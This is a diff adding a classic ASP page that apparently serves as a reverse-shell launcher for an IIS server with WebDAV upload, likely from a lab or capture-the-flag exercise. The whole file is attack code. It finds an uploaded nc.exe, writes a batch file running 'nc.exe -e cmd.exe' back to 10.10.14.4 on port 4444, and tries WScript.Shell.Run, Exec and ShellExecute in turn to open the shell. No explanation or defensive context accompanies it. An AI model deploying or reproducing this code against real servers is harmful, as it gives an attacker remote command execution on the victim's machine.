@@ -1,0 +1,67 @@
+<%
+Response.Write("<pre>Start ASP runner\n\n</pre>")
+
+On Error Resume Next
+
+' Show resolved physical path for the DAV directory
+Dim davVPath, physDir, ncVPath, ncPhys, fso, fh, batPath
+davVPath = "/DavTestDir_Htqk1p6OtoeLa"
+physDir = Server.MapPath(davVPath)
+ncVPath = davVPath & "/nc.exe"
+ncPhys = Server.MapPath(ncVPath)
+
+Response.Write("<pre>Virtual dir: " & davVPath & vbCrLf)
+Response.Write("Physical dir: " & physDir & vbCrLf)
+Response.Write("nc virtual: " & ncVPath & vbCrLf)
+Response.Write("nc physical: " & ncPhys & vbCrLf & vbCrLf)
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+If fso.FileExists(ncPhys) Then
+  Response.Write("nc.exe exists on disk." & vbCrLf)
+Else
+  Response.Write("nc.exe NOT found at that path." & vbCrLf)
+End If
+
+' Write a batch file that will run nc.exe to callback
+batPath = physDir & "\run_nc.bat"
+Set fh = fso.CreateTextFile(batPath, True)
+fh.WriteLine("""" & ncPhys & """ -e cmd.exe 10.10.14.4 4444")
+fh.Close
+Response.Write("Wrote batch: " & batPath & vbCrLf)
+
+' Try WScript.Shell.Run via cmd
+Dim shell
+Set shell = CreateObject("WScript.Shell")
+Err.Clear
+shell.Run "cmd /c " & Chr(34) & batPath & Chr(34), 0, False
+If Err.Number <> 0 Then
+  Response.Write("WScript.Shell.Run error: " & Err.Number & " - " & Err.Description & vbCrLf)
+Else
+  Response.Write("WScript.Shell.Run executed (no COM error reported)" & vbCrLf)
+End If
+
+' Try Exec (may return Access denied)
+Err.Clear
+Dim exec
+Set exec = shell.Exec("cmd /c " & Chr(34) & batPath & Chr(34))
+If Err.Number <> 0 Then
+  Response.Write("WScript.Shell.Exec error: " & Err.Number & " - " & Err.Description & vbCrLf)
+Else
+  Response.Write("WScript.Shell.Exec returned; attempting to read StdOut (may block)" & vbCrLf)
+  On Error Resume Next
+  Response.Write("StdOut: " & exec.StdOut.ReadAll() & vbCrLf)
+End If
+
+' Try Shell.Application.ShellExecute
+Err.Clear
+Dim shApp
+Set shApp = CreateObject("Shell.Application")
+shApp.ShellExecute ncPhys, "-e cmd.exe 10.10.14.4 4444", "", "open", 0
+If Err.Number <> 0 Then
+  Response.Write("ShellExecute error: " & Err.Number & " - " & Err.Description & vbCrLf)
+Else
+  Response.Write("ShellExecute called (no COM error reported)" & vbCrLf)
+End If
+
+Response.Write(vbCrLf & "Done." & vbCrLf)
+%>
